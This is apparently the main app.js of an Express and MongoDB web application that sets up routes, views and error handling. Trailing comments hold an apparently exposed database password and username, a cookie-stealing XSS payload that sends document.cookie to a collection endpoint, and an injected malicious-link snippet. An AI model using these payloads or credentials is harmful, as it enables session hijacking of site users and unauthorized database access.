var createError = require('http-errors');
var express = require('express');
var path = require('path');
var cookieParser = require('cookie-parser');
var logger = require('morgan');
var dotenv = require('dotenv');
dotenv.config({ path: "./.env" });
var cors = require('cors')

var mongoose = require('mongoose');
var passport = require('passport');

require('./passport');

var indexRouter = require('./routes/index');
var usersRouter = require('./routes/users');
var chatRouter = require('./routes/chats');
var bookRouter = require('./routes/book');
var docRouter = require('./routes/docs');

const MongoClient = require('mongodb').MongoClient;
const uri = process.env.MONGODB_URI;

mongoose.connect(uri)
  .then(() => {
    console.log('Connected to database ')
  })
  .catch((err) => {
    console.error(`Error connecting to the database. \n${err}`);
  })


global.User = require('./models/userSchema');
global.Chat = require('./models/chatSchema');
global.Book = require('./models/bookSchema');
global.Docs = require('./models/docSchema');
var app = express();

// view engine setup
app.set('views', path.join(__dirname, 'views'));
app.set('view engine', 'hbs');

app.use(logger('dev'));
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(cookieParser());
app.use(express.static(path.join(__dirname, 'public')));
app.use(cors());

app.use('/', indexRouter);
app.use('/', usersRouter);
app.use('/chat', chatRouter);
app.use('/books', bookRouter);
app.use('/documents', docRouter);

// catch 404 and forward to error handler
app.use(function (req, res, next) {
  next(createError(404));
});

// error handler
app.use(function (err, req, res, next) {
  // set locals, only providing error in development
  res.locals.message = err.message;
  res.locals.error = req.app.get('env') === 'development' ? err : {};

  // render the error page
  res.status(err.status || 500);
  res.render('error');
});

module.exports = app;
// ghrW3cmV2WdZuIqy
// admin
// mongodb+srv://admin:<password>@cluster0.nsx6b.mongodb.net/myFirstDatabase?retryWrites=true&w=majority





// 1
// fetch('http://localhost:3001/cookie/?q=' + document.cookie)
// 		.then()
// 		.catch(err => console.log(err));


// 2
// html += '<p>Your search query:</p>';
// 			html += '<pre>' + <a href="malicoiuslink.com"><img src="phone.png"></img></a>+ '</pre>';
// 			html += '<ul>';
